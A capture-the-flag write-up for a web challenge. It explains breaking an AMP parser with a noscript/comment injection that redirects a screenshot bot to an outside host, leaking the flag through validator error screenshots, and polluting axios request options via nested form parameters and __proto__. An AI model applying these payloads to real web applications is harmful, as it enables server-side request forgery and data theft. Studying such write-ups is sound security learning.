The amount of vulnerabilities and tricks stacked into this one challenge is crazy.

First, we have to look at how to get unintended behavior out of the DOM. The official writeup used the <amp-ad> element which did not require an additional source and could access an external site using the data-pubnetwork-lib property. The writeup by wbowling used a different and much cooler exploit in which they were able to break the AMP parser. It was essentially adding <noscript><!-- </noscript>  <meta http-equiv="refresh" content="0;url=http://aw.rs:12344"> --></noscript>. During the CTF, I noticed that the parser was failing test cases where elements were inserted inside of each other and closed. Also, HTML comments and noscript tags can have weird behavior so I definitely should've tried this out myself. 

Now with the very powerful primitive that the screenshot bot will visit our site there are still many steps to go. One interesting idea was how to exfiltrate the data from the database. The official writeup, and what I implemented, abused the fact that the validate route would report invalid AMP code so we could fit the flag in some part of invalid AMP and it would display it in a screenshot. This is perfect because it helps bypass SOP (we get to see what the browser sees). This was done by making a document with id `a` that started a script tag and a document with id `z` that ended the script tag. Then by inserting a meta tag, the error will show up clearly when requesting all documents from the collection. 

Another interseting thing was how to send objects in POST request parameters. I noted this in a comment but it is interesting that to pass a nested object you just need to nest the properties in brackets, ex. input[headers][Content-Type]. This combined with the fact that axios will take in an object and not just a URL was another trick in this challenge.

Finally, the last trick is to get the response to be text. There are 2 approaches and I used the method from the original writeup. The official writeup's method is to set `transformResponse` to null. However, in a POST request with form data, we cannot actually send a null, it would be "null". I'm not 100% sure why this works but setting the prototype on the object works to set the property to null, ex. `createInput('input[transformResponse][__proto__]', '')`. My best guess is that axios may be interpreting parameters weirdly in the source code. I didn't have time to actually look for the reasoning yet. The other approach from wbowling's solution is add `çˆ€` to the response and set the `responseEncoding` to `ascii` the json parsing fails and it returns text. This makes some sense as to why it would work as the parser doesn't recognize that character so it would default to text.
